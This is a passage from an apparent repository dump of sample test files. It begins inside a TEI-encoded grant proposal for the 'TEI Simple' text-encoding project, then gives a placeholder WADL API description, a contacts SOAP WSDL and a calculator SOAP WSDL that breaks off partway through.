        <p>The Text Encoding Initiative (TEI) has developed over 20 years into a key technology in text-centric humanities disciplines, with an extremely wide range of applications, from diplomatic editions to dictionaries, from prosopography to speech transcription and linguistic analysis. It has been able to achieve its range of use by adopting a <hi rend="italic">descriptive</hi> rather than <hi rend="italic">prescriptive </hi> approach , by recommending <hi rend="italic">customization</hi> to suit particular projects, and by eschewing any attempt to dictate how the digital texts should be rendered or exchanged. However, this flexibility has come at the cost of relatively limited success in interoperability. In our view there is a distinct set of uses (primarily in the area of digitized ‘European’-style books) that would benefit from a <hi rend="italic">prescriptive</hi> recipe for digital text; this will sit alongside other domain-specific, constrained TEI customizations, such as the very successful <hi rend="italic">Epidoc</hi> in the epigraphic community.  TEI Simple may become a prototype for a new family of constrained customizations. For instance, a TEI Simple MS  for manuscript based work could be built on top of  the ENRICH project, drawing on many of the lessons and some of the code for TEI Simple. </p>
        <p>The TEI has long maintained an introductory subset (TEI Lite), and a constrained customization for use in outsourcing production to commercial vendors (TEI Tite), but both of these permit enormous variation, and have nothing to say about processing. The present project can be viewed in some ways as a revision of TEI Lite, re-examining the basis of the choices therein, focusing it for a more specific area, and adding a "cradle to grave" processing model that associates the TEI Simple schema with explicit and standardized options for displaying and querying texts. This means being able to specify what a programmer should do with particular TEI elements when they are encountered, allowing programmers to build stylesheets that work for everybody and to query a corpus of documents reliably.</p>
        <p>This proposal, TEI Simple, will focus on interoperability, machine generation, and low-cost integration. The TEI architecture facilitates customizations of many kinds; TEI Simple aims to produce a complete 'out of the box' customization which meets the needs of the many users for whom the task of creating a customization is daunting or seems irrelevant. TEI Simple in no way intends to constrain the expressive liberty of encoders who do not think that it is either possible or desirable to follow this path. It does, however, promise to make life easier for those who think there is some virtue in travelling that path as far as it will take you, which for quite a few projects will be far enough. Some users will never feel the need to move beyond it, others will outgrow it, and when they do they will have learned enough to do so.</p>
        <p>‘Comparability and interoperability with other resources’ are an increasingly important topic on various Digital Humanities agendas. Echoes of it are found in a recent ‘work set construction’ Mellon grant to the Hathi Trust Research Centre. Under the heading ‘Wissenschaftliche Sammlungen’ it is a major part of an ambitious DARIAH project anchored at the SUB Göttingen. Progress towards it may be slow, tedious, and partial, but ‘simplicity, interoperability, broad use and reuse’, and ‘comparability and interoperability with other resources’ are important goals to keep in mind for many purposes. For a lot of current and future users of the TEI the really important benefits come from the simple stuff, and beyond some level of complexity they begin to feel some sympathy with Andrew Prescott's not very kind phrase about ‘angels dancing on angle brackets.’<note place="foot" xml:id="ftn1" n="1"><p rend="footnote text"> In “Consumers, creators or commentators? Problems of audience and mission in the digital humanities “</p><p rend="footnote text">Arts and Humanities in Higher Education published online 1 December 2011, http://ahh.sagepub.com/content/early/2011/11/30/1474022211428215</p></note></p>
        <p>A major driver for this project is the texts created by phase 1 of the EEBO-TCP project, which will be placed in the public domain on 1 January 2015. Another 45,000 texts will join over the following five years, creating by 2020 an archive of 70,000 consistently encoded books published in England from 1475 to 1700, including works of literature, philosophy, politics, religion, geography, science and all other areas of human endeavor. When we compare the query potential of the EEBO TCP texts in their current and quite simple encoding with flat file versions of those text, it is clear that the difference in query potential is very high, especially if you add to that coarse encoding simple forms of linguistic annotation or named entity tagging that can be added in a largely algorithmic fashion. During 2012 and 2013 extensive work has been undertaken at Northwestern, Michigan and Oxford to enrich these texts and bring them into line with the current TEI Guidelines (where necessary working with the TEI to modify the Guidelines). TEI Simple will use this corpus as a point of departure and will provide its users with a friendlier environment for manipulating EEBO texts in various projects. But TEI Simple should not be understood as an EEBO specific project. We believe that, given the extraordinary degree of internal diversity in the EEBO source files, a project that starts from them can, with appropriate modifications, accommodate a wide range of printed texts differing in language, genre, or time and place of origin. </p>
      </div>
      <div>
        <head><anchor xml:id="SECTION_1003"/>Objectives</head>
        <p>TEI Simple has the following high-level objectives:</p>
        <list type="ordered">
          <item>Definition of a new <hi rend="italic">highly constrained</hi> and <hi rend="italic">prescriptive</hi> subset of the Text Encoding Initiative (TEI) Guidelines suited to the representation of early modern and modern books. The degree of detail supported will be sufficient to encompass, at a minimum, the current practices of the TCP's EEBO, ECCO, and Evans collections plus those of other major European initiatives such as Text Grid or the DTA in Germany, and the Consortium Cahier in France.</item>
          <item>Creation of a notation (as an extension to TEI's ODD metalanguage) for specifying processing rules for TEI encoded texts,<note place="foot" xml:id="ftn2" n="2"><p rend="footnote text"> The paper on “Documenter des “attentes applicatives” (processing expectations)” by Frédéric Glorieux and Vincent Jolivet at TEI Members Meeting 2013 (http://digilab2.let.uniroma1.it/teiconf2013/program/papers/abstracts-paper/ ) also addresses this area.</p></note> referencing web standards such as XPath, CSS and XSL FO.</item>
          <item>Reference implementations of processing rules defined for this TEI subset.</item>
          <item>Formal mapping of the TEI elements used by Simple to the CIDOC CRM, allowing for full interoperability with the Europeana Data Model, in order to facilitate the participation of projects in the Europeana repositories.</item>
          <item>Definition and implementation of machine-readable descriptions of the encoding status and richness of TEI texts, providing a “TEI Performance Indicators” indicating to a user what they can expect to use the text for.</item>
        </list>
        <p>The aim is to lower the access barriers to working with TEI-encoded texts in various web environments. Programmers familiar with a particular web environment, whether Django, Drupal, eXist, Ruby on Rails, or others will be able to integrate TEI Simple-based projects into their environment with moderate effort and with no more than their usual tools and skills.</p>
        <p>The project will adhere to the following principles:</p>
        <list type="unordered">
          <item>As little overlap as possible, and as much compatibility as possible, with existing repository projects</item>
          <item>At least as prescriptive as level 3 of the <hi rend="italic">Best Practices for TEI in Libraries</hi></item>
          <item>Encompassing I18N principles at all times</item>
          <item>Useable implementations of all features</item>
        </list>
        <p>Outcomes from TEI Simple, consisting of a documented definition in ODD of the TEI subset, a set of processing rules, and extensions to the TEI ODD language to record processing expectations, will be fully integrated into the TEI infrastructure with ongoing maintenance by the TEI Technical Council.</p>
        <p>TEI Simple is intended to be <hi rend="italic">complementary</hi> to community projects like the TAPAS project, and to the established work of TextGrid, the German Text Archive (the DTA ‘base format’, which shares many of the goals of TEI Simple) and other national projects.</p>
      </div>
      <div>
	<head>The processing model</head>
	<p>The  current plan for a processing model for Simple is that it will define three stages: <list type="ordered">
	<item>In the first stage, every TEI Simple element is assigned to a category, according to a taxonomy whose first draft is below.
This allows a processor to know whether to handle the element or not, and broadly speaking
how to display or otherwise process it. Note how XPath may be used used to refine a name.</item>
<item>In the second stage, the categories are mapped to a presentation format, using HTML and CSS concepts
where possible.</item>
<item>In the third stage, a normalized set of property values is created for each element, where the combination
of the <emph>rend</emph>, <emph>rendition</emph> and <emph>style</emph> attributes, and the
<gi>rendition</gi> element, are interpreted to map to the names and allowed values for CSS.  This all allows a
processor to work out how to present that element in the current context. </item>
      </list>
	</p>
<table>
<head>A preliminary processing categorisation</head>
<row role="label"><cell>Category</cell><cell>Meaning</cell><cell>Example</cell></row>
<row><cell>1</cell><cell>metadata header</cell><cell>fileDesc</cell></row>
<row><cell>2</cell><cell>section heading</cell><cell>head[parent::div]</cell></row>
<row><cell>3</cell><cell>title of object (figure, table etc)</cell><cell>head[not(parent::div)]</cell></row>
<row><cell>4</cell><cell>structural division</cell><cell>div</cell></row>
<row><cell>5</cell><cell>uncategorized block level object</cell><cell>quotation</cell></row>
<row><cell>6</cell><cell>semantic block level object</cell><cell>person</cell></row>
<row><cell>7</cell><cell>uncategorized inline object</cell><cell>hi</cell></row>
<row><cell>8</cell><cell>semantic inline object</cell><cell>persName</cell></row>
<row><cell>9</cell><cell>list</cell><cell>list</cell></row>
<row><cell>10</cell><cell>list item</cell><cell>item</cell></row>
<row><cell>11</cell><cell>table</cell><cell>table</cell></row>
<row><cell>12</cell><cell>cell</cell><cell>cell</cell></row>
<row><cell>13</cell><cell>row</cell><cell>row</cell></row>
<row><cell>14</cell><cell>out of line note</cell><cell/></row>
<row><cell>15</cell><cell>figure</cell><cell>figure</cell></row>
<row><cell>16</cell><cell>pointer</cell><cell>ptr</cell></row>
<row><cell>17</cell><cell>Janus element (alternate children)</cell><cell>choice</cell></row>
<row><cell>18</cell><cell>modern commentary element</cell><cell>desc</cell></row>
</table>

<p>Processors can now create a variety of outputs without having to maintain specific rule sets for TEI Simple.
The rules for stage 1 and stage 2 are maintained as part of the ODD schema for Simple, so a processor will 
read both the source document and the corresponding ODD file (or some compiled version of if), and have access to all the information it needs.</p>
<p>The processing model assertions will be modelled in ODD using a notation similar to Schematron constraints, allowing
for multiple categories for a given element, depending on an XPath filter.</p>
<p>There are two important differences between this setup and the "TEI to XXX" stylesheets (eg <ptr target="https://github.com/TEIC/Stylesheets"/>)
which have been developed many times: <list type="ordered"><item>The initial explicit assertion of a category gives a place
for the target user of Simple to commit to a style of output, separately from the details of the rendering</item>
<item>The rules are tied to the schema, allowing the actual (eg) TEI to LaTeX or TEI to Word transformations to be
completely agnostic.</item></list>
We may contrast this with an example from the TEI Stylesheets, where an XSL function which 
determines whether to render something as bold mixes up the context with the attributes,
and is very hard to tailor for a constrained subset like Simple:
<egXML xmlns="http://www.tei-c.org/ns/Examples">
 <xsl:function name="tei:render-bold" as="xs:boolean">
    <xsl:param name="element"/>
    <xsl:for-each select="$element">
      <xsl:choose>
        <xsl:when test="@rend='odd_label'">true</xsl:when>
        <xsl:when test="parent::tei:hi[starts-with(@rend,'specList-')]">true</xsl:when>
        <xsl:when test="self::tei:docAuthor">true</xsl:when>
        <xsl:when test="self::tei:label[following-sibling::tei:item]">true</xsl:when>
        <xsl:when test="starts-with(@rend,'specList-')">true</xsl:when>
        <xsl:when test="starts-with(parent::tei:hi/@rend,'specList-')">true</xsl:when>
        <xsl:when test="@rend='label'">true</xsl:when>
        <xsl:when test="@rend='wovenodd'">true</xsl:when>
        <xsl:when test="@rend='important'">true</xsl:when>
        <xsl:when test="@rend='specChildModule'">true</xsl:when>
        <xsl:when test="ancestor-or-self::tei:cell[@rend='wovenodd-col1']">true</xsl:when>
        <xsl:when test="ancestor-or-self::tei:cell[@role='label']">true</xsl:when>
        <xsl:when test="ancestor-or-self::*[@rend][contains(@rend,'bold')]">true</xsl:when>
        <xsl:when test="parent::tei:hi[starts-with(@rend,'specList-')]">true</xsl:when>
        <xsl:when test="self::tei:cell and parent::tei:row[@role='label']">true</xsl:when>
        <xsl:when test="self::tei:label[following-sibling::tei:item]">true</xsl:when>
        <xsl:otherwise>false</xsl:otherwise>
      </xsl:choose>
    </xsl:for-each>
  </xsl:function>
</egXML>
</p>
      </div>

      <div>
        <head>Programme of work and budget</head>
        <p>We propose a total budget of $100,000, divided into labour costs  ($57,600), travel and meeting costs ($33,000), and a contingency fund ($9,400). </p>

<p>The work will be undertaken in three ways:
<list type="ordered">
<item>Contributed time and expertise by members of the advisory panel, and other members
of the TEI community, in consultation events for which travel expenses may be paid.</item>
<item>Technical development sprints during which the core programming tasks will be completed,
in some cases as a group activity at the same location. Staff will be paid for their participation in these sessions.</item>
<item>Some outputs will be commissioned at an agreed cost from partner organisations or individuals.</item>
</list>
The aim is to ensure that payments from the project are tied to explicit deliverables.</p>

<p>The PIs and  advisory panel will contribute their
time to the project but will be reimbursed for travel expenses. Some
of the work will, with the agreement of the TEI Technical Council, be
managed under the TEI's existing work group mechanism, which means
funding expenses of subject experts for workshop meetings.</p>

        <p>Broadly speaking, the work packages and outputs run in sequence, each depending on the previous one.</p>
        <table rend="rules">
          <row>
            <cell/>
            <cell>
              <hi rend="bold">Task</hi>
            </cell>
            <cell>
              <hi rend="bold">Method</hi>
            </cell>
            <cell>
              <hi rend="bold">FTE Days</hi>
            </cell>
            <cell>
              <hi rend="bold">Salary cost ($)</hi>
            </cell>
            <cell>
              <hi rend="bold">Expenses cost ($)</hi>
            </cell>
          </row>
          <row>
            <cell>1</cell>
            <cell>Management</cell>
            <cell>Three face to face meetings of the PIs and the advisory group; tri-weekly video-conference planning meetings</cell>
            <cell>0</cell>
            <cell>0</cell>
            <cell>18,000</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>2</cell>
            <cell>Definition of the prescriptive subset in TEI ODD</cell>
            <cell>Workshop sprint</cell>
            <cell>30</cell>
            <cell>10,800</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>3</cell>
            <cell>Extension to the TEI ODD language to support processing expectations</cell>
            <cell>TEI working group, 2 meetings</cell>
            <cell/>
            <cell/>
            <cell>15,000</cell>
          <cell></cell></row>
          <row>
            <cell>4</cell>
            <cell>Definition of processing expectations for TEI Simple</cell>
            <cell>Researcher 1</cell>
            <cell>25</cell>
            <cell>9,000</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>5</cell>
            <cell>Implementation of processing expectations</cell>
            <cell>PIs, Researcher 2, community</cell>
            <cell>30</cell>
            <cell>10,800</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>6</cell>
            <cell>Maintainable open access documentation for TEI Simple</cell>
            <cell>Researcher 1</cell>
            <cell>20</cell>
            <cell>7,200</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>7</cell>
            <cell>Mapping TEI Simple to other ontologies</cell>
            <cell>PIs, Researcher 1</cell>
            <cell>15</cell>
            <cell>5,400</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>8</cell>
            <cell>Development of a markup system for recording the formal profile of a text</cell>
            <cell>Researcher 1, community</cell>
            <cell>15</cell>
            <cell>5,400</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>9</cell>
            <cell>Implementation of profile reporting</cell>
            <cell>Researcher 2</cell>
            <cell>25</cell>
            <cell>9,000</cell>
            <cell/>
          <cell></cell></row>
          <row>
            <cell><anchor xml:id="GoBack1"/>10</cell>
            <cell>Integration of TEI Simple into the Guidelines and other TEI Consortium infrastructure</cell>
            <cell>Discussion with TEI Council, PIs</cell>
            <cell/>
            <cell/>
            <cell/>
          <cell></cell></row>
          <row>
            <cell>11</cell>
            <cell>User validation</cell>
            <cell>Open workshop at midpoint of project</cell>
            <cell/>
            <cell/>
            <cell>5,000</cell>
          <cell></cell></row>
          <row>
            <cell/>
            <cell>Contingency </cell>
            <cell/>
            <cell/>
            <cell/>
            <cell>4,400</cell>
          <cell></cell></row>
          <row>
            <cell/>
            <cell>
              <hi rend="bold">Total budget</hi>
            </cell>
            <cell/>
            <cell>
              <hi rend="bold">160</hi>
            </cell>
            <cell>
              <hi rend="bold">57,600</hi>
            </cell>
            <cell>
              <hi rend="bold">42,400</hi>
            </cell>
            <cell>
              <hi rend="bold">100,000</hi>
            </cell>
	  </row>
        </table>
      </div>
      <div>
        <head><anchor xml:id="SECTION_1005"/>Collaboration, management, timing</head>
        <p>TEI Simple is a cross-Atlantic collaboration between (at least) the following partners:</p>
        <list type="ordered">
          <item>Northwestern University, Chicago: Professor Martin Mueller</item>
          <item>The University of Oxford: Sebastian Rahtz</item>
          <item>The Text Encoding Initiative Consortium: Elena Pierazzo (Chair)</item>
	  <item>The University of Nebraska: Brian Pytlik Zillig</item>
          <item>Université Paris-Sorbonne: Frédéric Glorieux and Vincent Jolivet</item>
          <item>The Deutsches Textarchiv (DTA): Alexander Geyken</item>
          <item>TextGrid</item>
        </list>
        <p>The project will be directed by Martin Mueller (Northwestern) and Sebastian Rahtz (Oxford). </p>
        <p>TEI Simple will commence work on 1st August 2014, and aim to complete the first stage of work in time for the TEI Annual Meeting in late October 2014. The launch at the Annual Meeting will be followed by eight more months of development and revision before final sign-off on July 1st 2015.</p>
      </div>
    </body>
  </text>
</TEI>
</file>

<file path="sample_data/test_files/small/wadl/sample-wadl.xml">
<application xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xmlns:xsd="http://www.w3.org/2001/XMLSchema"
             xmlns:apigee="http://api.apigee.com/wadl/2010/07/"
             xmlns="http://wadl.dev.java.net/2009/02"
             xsi:schemaLocation="http://wadl.dev.java.net/2009/02 http://apigee.com/schemas/wadl-schema.xsd http://api.apigee.com/wadl/2010/07/ http://apigee.com/schemas/apigee-wadl-extensions.xsd">

    <!-- Base defines the domain and base path of the endpoint -->
    <resources base="http://api.mydomain.com/1">

        <!-- A simple resource with a GET method -->
        <resource path="/resource1">
            <!-- Resources that are the same but have multiple verbs can have multiple method items in the WADL. -->
            <!-- Methods should each have a unique id. -->
            <!-- The attribute displayName can be used to control the name that appears in the list in the Console. -->
            <method id="method1" name="GET" apigee:displayName="Method 1">

                <!-- Tags are used to organize the list of methods. Primary tag will list the default placement. -->
                <apigee:tags>
                    <apigee:tag primary="true">Group 1</apigee:tag>
                    <apigee:tag>Tag 2</apigee:tag>
                </apigee:tags>

                <!-- Is authentication required for this method? -->
                <apigee:authentication required="false"/>

                <!-- Example element is used to specify the sample URL to display in the Console's request URL field. -->
                <!-- Note: This is not used by the new Console -->
                <apigee:example url="/resource1"/>

                <!-- The content of the doc element is shown as a tooltip in the Console's method list. -->
                <doc apigee:url="http://api.mydomain.com/doc/resource1/method1">
                    A simple GET method.
                </doc>
            </method>
        </resource>

        <!-- A resource with a GET method that requires a template parameter, a query parameter and a header -->
        <resource path="/resource2.{format}">
            <!-- If a param is required, specify so. Default values can also be supplied. -->
            <!-- A "query" style denotes a query parameter. "header" is a common alternative. -->

            <param name="format" required="true" type="xsd:string" style="template" default="json">
                <!-- Docs are optional, but recommended. -->
                <doc>Response format.</doc>
                <option value="json" mediaType="application/json"/>
                <option value="xml" mediaType="application/xml"/>
            </param>

            <param name="param1" required="true" type="xsd:string" style="query" default="12345">
                <doc>
                    Parameter description.
                </doc>
            </param>

            <param name="header1" required="true" type="xsd:string" style="header" default="12345">
                <doc>
                    Parameter description.
                </doc>
            </param>

            <method id="method2" name="GET" apigee:displayName="Method 2">
                <apigee:tags>
                    <apigee:tag primary="true">Group 1</apigee:tag>
                </apigee:tags>

                <apigee:authentication required="true"/>

                <apigee:example url="/resource2.{format}"/>

                <doc apigee:url="http://api.mydomain.com/doc/resource2/method1">
                    A GET method that requires a template parameter, a query parameter and a header.
                </doc>
            </method>
        </resource>

        <!-- A resource with a POST method that takes an XML payload. -->
        <resource path="/resource3.{format}">
            <param default="json" name="format" required="true" style="template" type="xsd:string">
                <doc>Response format.</doc>
                <option mediaType="application/json" value="json"/>
                <option mediaType="application/xml" value="xml"/>
            </param>

            <method id="method3" name="POST" apigee:displayName="Method 3">
                <apigee:tags>
                    <apigee:tag primary="true">Group 2</apigee:tag>
                </apigee:tags>

                <apigee:authentication required="false"/>

                <apigee:example url="/resource3.{format}"/>

                <doc apigee:url="http://api.mydomain.com/doc/resource3/method1">
                    A POST method that takes an XML payload.
                </doc>

                <!-- This section captures parameters and body content specific to this method. -->
                <request>
                    <!-- This parameter is applicable only for this method; while those defined at the resource level are applicable for all methods of the resource -->
                    <param name="param1" required="true" type="xsd:string" style="query" default="12345">
                        <doc>
                            Parameter description.
                        </doc>
                    </param>

                    <!-- This section contains the body representation, e.g. form-encoded parameters, an XML/JSON payload, an attachment etc. -->
                    <representation>
                        <!-- This section describes the body content, i.e. the payload. -->
                        <!-- Set required to true to indicate the content as mandatory in the Console -->
                        <apigee:payload required="true">
                            <!-- Docs are optional, but recommended. -->
                            <doc apigee:url="http://api.mydomain.com/doc/resource3/method1">
                                Content description.
                            </doc>
                            <!-- Body content. -->
                            <apigee:content>
                                <![CDATA[
-                                <sample>
-                                    <body>
-                                        content testing
-                                    </body>
-                                </sample>
-                                ]]>
                            </apigee:content>
                        </apigee:payload>
                    </representation>
                </request>
            </method>
        </resource>

        <!-- A resource with a PUT method that takes form-encoded parameters in the body of the request. -->
        <resource path="/resource4.{format}">
            <param default="json" name="format" required="true" style="template" type="xsd:string">
                <doc>Response format.</doc>
                <option mediaType="application/json" value="json"/>
                <option mediaType="application/xml" value="xml"/>
            </param>

            <method id="method4" name="PUT" apigee:displayName="Method 4">
                <apigee:tags>
                    <apigee:tag primary="true">Group 2</apigee:tag>
                </apigee:tags>

                <apigee:authentication required="false"/>

                <apigee:example url="/resource4.{format}"/>

                <doc apigee:url="http://api.mydomain.com/doc/resource4/method1">
                    A PUT method that takes form-encoded parameters in the body of the request.
                </doc>

                <request>
                    <!-- This section contains the body representation, e.g. form-encoded parameters, an XML/JSON payload, an attachment etc. -->
                    <representation>
                        <!-- Specify parameters that need to go as part of the request body -->
                        <param name="param2" required="true" type="xsd:string" style="query" default="12345">
                            <doc>
                                Parameter description.
                            </doc>
                        </param>
                    </representation>
                </request>
            </method>
        </resource>

        <!-- A resource with a PUT method that takes an image attachment. -->
        <resource path="/resource5.{format}">
            <param default="json" name="format" required="true" style="template" type="xsd:string">
                <doc>Response format.</doc>
                <option mediaType="application/json" value="json"/>
                <option mediaType="application/xml" value="xml"/>
            </param>

            <method id="method5" name="PUT" apigee:displayName="Method 5">
                <apigee:tags>
                    <apigee:tag primary="true">Group 2</apigee:tag>
                </apigee:tags>

                <apigee:authentication required="false"/>

                <apigee:example url="/resource5.{format}"/>

                <doc apigee:url="http://api.mydomain.com/doc/resource5/method1">
                    A PUT method that takes an image attachment.
                </doc>

                <request>
                    <!-- This section contains the body representation, e.g. form-encoded parameters, an XML/JSON payload, an attachment etc. -->
                    <representation>
                        <!-- This section describes the attachments for a method. Currently, the Console only supports one attachment. -->
                        <apigee:attachments>
                            <!-- The name attribute, which is mandatory, determines the name populated in the Console and also the MIME part name. -->
                            <!-- The required attribute, which is optional, is set to true to indicate the attachment as mandatory in the Console. -->
                            <!-- The contentDisposition attribute, which is optional, sets the Content-Disposition header in the generated MIME request.
                                 Some MIME request processors expect the Content-Disposition to be "attachment", while some expect it to be "form-data". -->
                            <apigee:attachment name="image" required="true" contentDisposition="form-data">
                                <doc>Attachment description.</doc>
                            </apigee:attachment>
                        </apigee:attachments>
                    </representation>
                </request>
            </method>
        </resource>

    </resources>

</application>
</file>

<file path="sample_data/test_files/small/wsdl/bet365-contacts-soap.wsdl">
<?xml version="1.0"?>
<definitions name="contacts"
             targetNamespace="http://example.com/contacts.wsdl"
             xmlns:tns="http://example.com/contacts.wsdl"
             xmlns:types="http://example.com/contacts.xsd"
             xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
             xmlns="http://schemas.xmlsoap.org/wsdl/">

  <types>
    <xsd:schema targetNamespace="http://example.com/contacts.xsd"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema">
      <xsd:element name="contact">
        <xsd:complexType>
          <xsd:sequence>
            <xsd:element name="id" type="xsd:integer" minOccurs="0"/>
            <xsd:element name="first_name" type="xsd:string"/>
            <xsd:element name="last_name" type="xsd:string"/>
            <xsd:element name="projects" type="xsd:string" 
                         minOccurs="0" maxOccurs="unbounded"/>
          </xsd:sequence>
        </xsd:complexType>
      </xsd:element>
      <xsd:element name="id">
         <xsd:complexType>
           <xsd:sequence>
             <xsd:element name="id" type="xsd:integer"/>
           </xsd:sequence>
         </xsd:complexType>
      </xsd:element>
      <xsd:element name="LocaleOptions">
        <xsd:complexType>
          <xsd:sequence>
            <xsd:element name="language"  type="xsd:string" minOccurs="0"/>
            <xsd:element name="localizeErrors" type="xsd:boolean" minOccurs="0"/>
          </xsd:sequence>
        </xsd:complexType>
      </xsd:element>            
      <xsd:element name="DebuggingHeader">
        <xsd:complexType>
          <xsd:sequence>
            <xsd:element name="debugLevel" type="xsd:integer"/>
          </xsd:sequence>
        </xsd:complexType>
      </xsd:element>
    </xsd:schema>
  </types>

  <message name="store">
    <part name="body" element="types:contact"/>
  </message>

  <message name="store_response">
    <part name="body" element="types:id"/>
  </message>

  <message name="retrieve">
    <part name="body" element="types:id"/>
  </message>

  <message name="retrieve_response">
    <part name="body" element="types:contact"/>
  </message>

  <message name="Header">
    <part element="types:DebuggingHeader"              name="DebuggingHeader"/>
    <part element="types:LocaleOptions"                name="LocaleOptions"/>
  </message>

  <portType name="contacts_port_type">
    <operation name="store">
      <input message="tns:store"/>
      <output message="tns:store_response"/>
    </operation>
    <operation name="retrieve">
      <input message="tns:retrieve"/>
      <output message="tns:retrieve_response"/>
    </operation>
  </portType>

  <binding name="contacts_binding" type="tns:contacts_port_type">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    <operation name="store">
      <soap:operation soapAction="store"/>
      <input>
        <soap:header use="literal" message="tns:Header" part="LocaleOptions"/>
        <soap:header use="literal" message="tns:Header" part="DebuggingHeader"/>
        <soap:body use="literal"/>
      </input>
      <output>
        <soap:body use="literal"/>
      </output>
    </operation>
    <operation name="retrieve">
      <soap:operation soapAction="retrieve"/>
      <input>
        <soap:body use="literal"/>
      </input>
      <output>
        <soap:body use="literal"/>
      </output>
    </operation>
  </binding>

  <service name="contacts_service">
    <port name="contacts_port" binding="tns:contacts_binding">
      <soap:address location="http://localhost:8080"/>
    </port>
  </service>

</definitions>
</file>

<file path="sample_data/test_files/small/wsdl/calculator-soap.wsdl">
<?xml version="1.0" encoding="utf-8"?>
<wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://tempuri.org/" xmlns:s="http://www.w3.org/2001/XMLSchema" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" targetNamespace="http://tempuri.org/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  <wsdl:types>
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
      <s:element name="Add">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int" />
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="AddResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="AddResult" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Subtract">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int" />
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="SubtractResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="SubtractResult" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Multiply">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int" />
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="MultiplyResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="MultiplyResult" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Divide">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int" />
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="DivideResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="DivideResult" type="s:int" />
          </s:sequence>
        </s:complexType>
      </s:element>
    </s:schema>
  </wsdl:types>
  <wsdl:message name="AddSoapIn">
    <wsdl:part name="parameters" element="tns:Add" />
  </wsdl:message>
  <wsdl:message name="AddSoapOut">
    <wsdl:part name="parameters" element="tns:AddResponse" />
  </wsdl:message>
  <wsdl:message name="SubtractSoapIn">
    <wsdl:part name="parameters" element="tns:Subtract" />
  </wsdl:message>
  <wsdl:message name="SubtractSoapOut">
    <wsdl:part name="parameters" element="tns:SubtractResponse" />
  </wsdl:message>
  <wsdl:message name="MultiplySoapIn">
    <wsdl:part name="parameters" element="tns:Multiply" />
  </wsdl:message>
  <wsdl:message name="MultiplySoapOut">
    <wsdl:part name="parameters" element="tns:MultiplyResponse" />
  </wsdl:message>
  <wsdl:message name="DivideSoapIn">
    <wsdl:part name="parameters" element="tns:Divide" />
  </wsdl:message>
  <wsdl:message name="DivideSoapOut">
    <wsdl:part name="parameters" element="tns:DivideResponse" />
  </wsdl:message>
  <wsdl:portType name="CalculatorSoap">
    <wsdl:operation name="Add">
      <wsdl:documentation xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">Adds two integers. This is a test WebService. ©DNE Online</wsdl:documentation>
      <wsdl:input message="tns:AddSoapIn" />
      <wsdl:output message="tns:AddSoapOut" />
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <wsdl:input message="tns:SubtractSoapIn" />
      <wsdl:output message="tns:SubtractSoapOut" />
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <wsdl:input message="tns:MultiplySoapIn" />
      <wsdl:output message="tns:MultiplySoapOut" />
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <wsdl:input message="tns:DivideSoapIn" />
      <wsdl:output message="tns:DivideSoapOut" />
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="CalculatorSoap" type="tns:CalculatorSoap">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http" />
    <wsdl:operation name="Add">
      <soap:operation soapAction="http://tempuri.org/Add" style="document" />
      <wsdl:input>
        <soap:body use="literal" />
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal" />
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <soap:operation soapAction="http://tempuri.org/Subtract" style="document" />
      <wsdl:input>
        <soap:body use="literal" />
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal" />
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <soap:operation soapAction="http://tempuri.org/Multiply" style="document" />
      <wsdl:input>
        <soap:body use="literal" />
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal" />
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <soap:operation soapAction="http://tempuri.org/Divide" style="document" />
